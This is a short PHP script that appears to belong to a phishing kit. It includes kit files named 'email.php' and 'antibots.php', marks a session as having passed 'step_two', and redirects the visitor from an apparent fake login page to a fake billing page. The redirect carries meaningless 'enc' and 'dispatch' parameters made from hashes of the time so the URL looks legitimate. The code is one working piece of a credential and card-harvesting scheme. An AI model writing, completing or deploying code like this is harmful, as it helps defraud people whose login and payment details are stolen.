<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../antibots.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
$_SESSION['step_two']  = true;
header('location: ../billing.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
  header('location: ../../login.php');
}

?>